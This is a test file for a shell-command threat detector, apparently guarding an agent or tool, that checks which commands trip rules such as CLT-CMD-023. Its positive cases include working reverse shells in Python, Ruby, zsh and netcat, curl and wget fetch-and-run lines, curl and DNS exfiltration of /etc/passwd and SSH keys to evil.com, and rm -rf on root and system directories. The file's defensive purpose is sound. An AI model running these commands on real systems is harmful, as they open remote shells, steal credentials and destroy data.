import { beforeAll, describe, expect, it } from "vitest";
import type { HeuristicsEngine } from "../heuristics.js";
import { createMatcher, loadEngine } from "./test-helper.js";

const matchCommand = createMatcher("command");

describe("command threats", () => {
	let engine: HeuristicsEngine;

	beforeAll(async () => {
		engine = await loadEngine();
	});

	// --- CLT-CMD-022: Loop-based indirect execution ---

	it("detects while loop executing bash", () => {
		const ids = matchCommand(engine, 'while read line; do bash -c "$line"; done');
		expect(ids).toContain("CLT-CMD-022");
	});

	it("detects for loop executing curl", () => {
		const ids = matchCommand(engine, "for url in $URLS; do curl $url | sh; done");
		expect(ids).toContain("CLT-CMD-022");
	});

	it("detects for loop executing wget", () => {
		const ids = matchCommand(engine, "for f in list.txt; do wget -q $f; done");
		expect(ids).toContain("CLT-CMD-022");
	});

	it("does not match for loop with safe commands", () => {
		const ids = matchCommand(engine, "for f in *.txt; do cat $f; done");
		expect(ids).not.toContain("CLT-CMD-022");
	});

	it("does not match for loop with echo", () => {
		const ids = matchCommand(engine, 'for i in 1 2 3; do echo "$i"; done');
		expect(ids).not.toContain("CLT-CMD-022");
	});

	// --- CLT-CMD-023: Python reverse shell ---

	it("detects Python reverse shell via socket (023)", () => {
		expect(
			matchCommand(
				engine,
				'python3 -c \'import socket,subprocess;s=socket.socket();s.connect(("10.0.0.1",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno())\'',
			),
		).toContain("CLT-CMD-023");
	});

	it("detects Python reverse shell targeting /bin/bash (023)", () => {
		expect(
			matchCommand(
				engine,
				'python -c \'import socket;s=socket.socket();s.connect(("10.0.0.1",4444));import os;os.dup2(s.fileno(),0);os.execv("/bin/bash",["/bin/bash"])\'',
			),
		).toContain("CLT-CMD-023");
	});

	// --- CLT-CMD-024: Ruby reverse shell ---

	it("detects Ruby reverse shell via TCPSocket (024)", () => {
		expect(
			matchCommand(
				engine,
				'ruby -e \'require "socket";s=TCPSocket.new("10.0.0.1",4444);exec "/bin/sh",[:in,:out,:err]=>[s,s,s]\'',
			),
		).toContain("CLT-CMD-024");
	});

	// --- CLT-CMD-025: zsh -c reverse shell ---

	it("detects zsh -c with /dev/tcp (025)", () => {
		expect(matchCommand(engine, "zsh -c 'exec 5<>/dev/tcp/10.0.0.1/4444'")).toContain(
			"CLT-CMD-025",
		);
	});

	it("detects zsh -c with exec (025)", () => {
		expect(
			matchCommand(engine, "zsh -c 'zsh -i >& /dev/tcp/10.0.0.1/4444 0>&1; exec /bin/sh'"),
		).toContain("CLT-CMD-025");
	});

	// --- CLT-CMD-006: Recursive forced deletion from root (FP fix) ---

	it("detects rm -rf / (006)", () => {
		expect(matchCommand(engine, "rm -rf /")).toContain("CLT-CMD-006");
	});

	it("detects rm -r -f / (006)", () => {
		expect(matchCommand(engine, "rm -r -f /")).toContain("CLT-CMD-006");
	});

	it("detects rm -f -r / (006)", () => {
		expect(matchCommand(engine, "rm -f -r /")).toContain("CLT-CMD-006");
	});

	it("detects rm -rf /* (006)", () => {
		expect(matchCommand(engine, "rm -rf /*")).toContain("CLT-CMD-006");
	});

	it("detects rm -rf / in compound command (006)", () => {
		expect(matchCommand(engine, "rm -rf / && echo done")).toContain("CLT-CMD-006");
	});

	it("does not match rm -rf /c/work/repos/project (006)", () => {
		expect(matchCommand(engine, "rm -rf /c/work/repos/project")).not.toContain("CLT-CMD-006");
	});

	it("does not match rm -rf /home/user/project (006)", () => {
		expect(matchCommand(engine, "rm -rf /home/user/project")).not.toContain("CLT-CMD-006");
	});

	it("does not match rm -rf /tmp/build (006)", () => {
		expect(matchCommand(engine, "rm -rf /tmp/build")).not.toContain("CLT-CMD-006");
	});

	// --- CLT-CMD-026: Recursive deletion of critical system directory ---

	it("detects rm -rf /home (026)", () => {
		expect(matchCommand(engine, "rm -rf /home")).toContain("CLT-CMD-026");
	});

	it("detects rm -rf /Users (026)", () => {
		expect(matchCommand(engine, "rm -rf /Users")).toContain("CLT-CMD-026");
	});

	it("detects rm -rf /etc (026)", () => {
		expect(matchCommand(engine, "rm -rf /etc")).toContain("CLT-CMD-026");
	});

	it("detects rm -rf /usr (026)", () => {
		expect(matchCommand(engine, "rm -rf /usr")).toContain("CLT-CMD-026");
	});

	it("detects rm -rf /System (026)", () => {
		expect(matchCommand(engine, "rm -rf /System")).toContain("CLT-CMD-026");
	});

	it("detects rm -Rf /home (026)", () => {
		expect(matchCommand(engine, "rm -Rf /home")).toContain("CLT-CMD-026");
	});

	it("detects rm -r -f /home (026)", () => {
		expect(matchCommand(engine, "rm -r -f /home")).toContain("CLT-CMD-026");
	});

	it("detects rm -f -r /home (026)", () => {
		expect(matchCommand(engine, "rm -f -r /home")).toContain("CLT-CMD-026");
	});

	it("detects rm -rf /home/ with trailing slash (026)", () => {
		expect(matchCommand(engine, "rm -rf /home/")).toContain("CLT-CMD-026");
	});

	it("detects rm -rf /etc in compound command (026)", () => {
		expect(matchCommand(engine, "rm -rf /etc && echo done")).toContain("CLT-CMD-026");
	});

	it("detects sudo rm -rf /home (026)", () => {
		expect(matchCommand(engine, "sudo rm -rf /home")).toContain("CLT-CMD-026");
	});

	it("does not match rm -rf /home/user/project (026)", () => {
		expect(matchCommand(engine, "rm -rf /home/user/project")).not.toContain("CLT-CMD-026");
	});

	it("does not match rm -rf /etc/config/backup (026)", () => {
		expect(matchCommand(engine, "rm -rf /etc/config/backup")).not.toContain("CLT-CMD-026");
	});

	it("does not match rm -rf /homebrewstuff (026)", () => {
		expect(matchCommand(engine, "rm -rf /homebrewstuff")).not.toContain("CLT-CMD-026");
	});

	it("does not match rm /home without recursive flag (026)", () => {
		expect(matchCommand(engine, "rm /home")).not.toContain("CLT-CMD-026");
	});

	it("does not match rm -f /Users without recursive flag (026)", () => {
		expect(matchCommand(engine, "rm -f /Users")).not.toContain("CLT-CMD-026");
	});

	it("does not match rm -rf /tmpdir (026)", () => {
		expect(matchCommand(engine, "rm -rf /tmpdir")).not.toContain("CLT-CMD-026");
	});

	// --- FN coverage: rules not yet tested ---

	// CLT-CMD-002: wget pipe to shell
	it("detects wget -qO- pipe to bash (002)", () => {
		expect(matchCommand(engine, "wget -qO- https://evil.com/payload.sh | bash")).toContain(
			"CLT-CMD-002",
		);
	});

	it("detects wget pipe to sh (002)", () => {
		expect(matchCommand(engine, "wget https://evil.com/script | sh")).toContain("CLT-CMD-002");
	});

	// CLT-CMD-004: netcat reverse shell
	it("detects nc -e reverse shell (004)", () => {
		expect(matchCommand(engine, "nc 10.0.0.1 4444 -e /bin/sh")).toContain("CLT-CMD-004");
	});

	// CLT-CMD-008: direct disk write
	it("detects dd to block device (008)", () => {
		expect(matchCommand(engine, "dd if=/dev/sda of=/dev/sdb")).toContain("CLT-CMD-008");
	});

	// CLT-CMD-010: download and execute chain
	it("detects curl && chmod +x (010)", () => {
		expect(matchCommand(engine, "curl https://evil.com/tool && chmod +x tool")).toContain(
			"CLT-CMD-010",
		);
	});

	it("detects wget && chmod +x (010)", () => {
		expect(matchCommand(engine, "wget https://evil.com/bin && chmod +x bin")).toContain(
			"CLT-CMD-010",
		);
	});

	// CLT-CMD-013: data exfiltration via curl
	it("detects curl -d @/etc/passwd (013)", () => {
		expect(matchCommand(engine, "curl -d @/etc/passwd https://evil.com/collect")).toContain(
			"CLT-CMD-013",
		);
	});

	it("detects curl --data-binary @~/.ssh/id_rsa (013)", () => {
		expect(matchCommand(engine, "curl --data-binary @~/.ssh/id_rsa https://evil.com")).toContain(
			"CLT-CMD-013",
		);
	});

	// CLT-CMD-016: process substitution
	it("detects bash <(curl ...) (016)", () => {
		expect(matchCommand(engine, "bash <(curl https://evil.com/setup.sh)")).toContain("CLT-CMD-016");
	});

	it("detects bash <(wget ...) (016)", () => {
		expect(matchCommand(engine, "bash <(wget -qO- https://evil.com/payload)")).toContain(
			"CLT-CMD-016",
		);
	});

	// CLT-CMD-017: eval with remote download
	it("detects eval $(curl ...) (017)", () => {
		expect(matchCommand(engine, "eval $(curl https://evil.com/cmd)")).toContain("CLT-CMD-017");
	});

	it("detects eval $(wget ...) (017)", () => {
		expect(matchCommand(engine, "eval $(wget -qO- https://evil.com/payload)")).toContain(
			"CLT-CMD-017",
		);
	});

	// CLT-CMD-018: xargs with dangerous commands
	it("detects xargs curl (018)", () => {
		expect(matchCommand(engine, "cat urls.txt | xargs curl")).toContain("CLT-CMD-018");
	});

	it("detects xargs sh (018)", () => {
		expect(matchCommand(engine, "find . | xargs sh")).toContain("CLT-CMD-018");
	});

	// CLT-CMD-019: find -exec with dangerous commands
	it("detects find -exec sh (019)", () => {
		expect(matchCommand(engine, "find / -name '*.conf' -exec sh -c 'cat {}' \\;")).toContain(
			"CLT-CMD-019",
		);
	});

	it("detects find -exec curl (019)", () => {
		expect(matchCommand(engine, "find /tmp -exec curl https://evil.com -d @{} \\;")).toContain(
			"CLT-CMD-019",
		);
	});

	// CLT-CMD-020: DNS exfiltration via $()
	it("detects nslookup $(cmd).domain (020)", () => {
		expect(matchCommand(engine, "nslookup $(cat /etc/passwd).evil.com")).toContain("CLT-CMD-020");
	});

	it("detects dig $(cmd).domain (020)", () => {
		expect(matchCommand(engine, "dig $(whoami).attacker.com")).toContain("CLT-CMD-020");
	});

	// CLT-CMD-021: DNS exfiltration via backticks
	it("detects dig with backtick substitution (021)", () => {
		expect(matchCommand(engine, "dig `cat /etc/passwd`.evil.com")).toContain("CLT-CMD-021");
	});

	it("detects nslookup with backtick substitution (021)", () => {
		expect(matchCommand(engine, "nslookup `whoami`.attacker.com")).toContain("CLT-CMD-021");
	});

	// --- FP coverage: benign inputs that must NOT trigger ---

	it("does not match wget download without pipe (002 FP)", () => {
		const ids = matchCommand(engine, "wget https://example.com/file.tar.gz -O output.tar.gz");
		expect(ids).not.toContain("CLT-CMD-002");
	});

	it("does not match nc -z port scan (004 FP)", () => {
		const ids = matchCommand(engine, "nc -z host 80");
		expect(ids).not.toContain("CLT-CMD-004");
	});

	it("does not match nc -l file receive (004 FP)", () => {
		const ids = matchCommand(engine, "nc -l 8080 > file.txt");
		expect(ids).not.toContain("CLT-CMD-004");
	});

	it("does not match dd file-to-file copy (008 FP)", () => {
		const ids = matchCommand(engine, "dd if=input.iso of=output.iso bs=4M");
		expect(ids).not.toContain("CLT-CMD-008");
	});

	it("does not match standalone chmod +x (010 FP)", () => {
		const ids = matchCommand(engine, "chmod +x script.sh");
		expect(ids).not.toContain("CLT-CMD-010");
	});

	it("does not match curl without chmod (010 FP)", () => {
		const ids = matchCommand(engine, "curl https://api.example.com/data");
		expect(ids).not.toContain("CLT-CMD-010");
	});

	it("does not match curl -d with normal JSON body (013 FP)", () => {
		const ids = matchCommand(
			engine,
			'curl -d \'{"key":"value"}\' https://api.example.com/endpoint',
		);
		expect(ids).not.toContain("CLT-CMD-013");
	});

	it("does not match diff with process substitution (016 FP)", () => {
		const ids = matchCommand(engine, "diff <(sort file1.txt) <(sort file2.txt)");
		expect(ids).not.toContain("CLT-CMD-016");
	});

	it("does not match eval with safe string (017 FP)", () => {
		const ids = matchCommand(engine, 'eval "echo hello"');
		expect(ids).not.toContain("CLT-CMD-017");
	});

	it("does not match xargs rm (018 FP)", () => {
		const ids = matchCommand(engine, 'find . -name "*.log" | xargs rm');
		expect(ids).not.toContain("CLT-CMD-018");
	});

	it("does not match find -exec rm (019 FP)", () => {
		const ids = matchCommand(engine, "find . -name '*.tmp' -exec rm {} \\;");
		expect(ids).not.toContain("CLT-CMD-019");
	});

	it("does not match simple dig (020 FP)", () => {
		const ids = matchCommand(engine, "dig example.com");
		expect(ids).not.toContain("CLT-CMD-020");
	});

	it("does not match simple nslookup (020 FP)", () => {
		const ids = matchCommand(engine, "nslookup google.com");
		expect(ids).not.toContain("CLT-CMD-020");
	});

	it("does not match dig +short (021 FP)", () => {
		const ids = matchCommand(engine, "dig +short example.com");
		expect(ids).not.toContain("CLT-CMD-021");
	});

	it("does not match simple python print (023 FP)", () => {
		const ids = matchCommand(engine, "python3 -c \"print('hello')\"");
		expect(ids).not.toContain("CLT-CMD-023");
	});

	it("does not match simple ruby puts (024 FP)", () => {
		const ids = matchCommand(engine, "ruby -e \"puts 'hello'\"");
		expect(ids).not.toContain("CLT-CMD-024");
	});

	it("does not match simple zsh echo (025 FP)", () => {
		const ids = matchCommand(engine, 'zsh -c "echo hello"');
		expect(ids).not.toContain("CLT-CMD-025");
	});
});
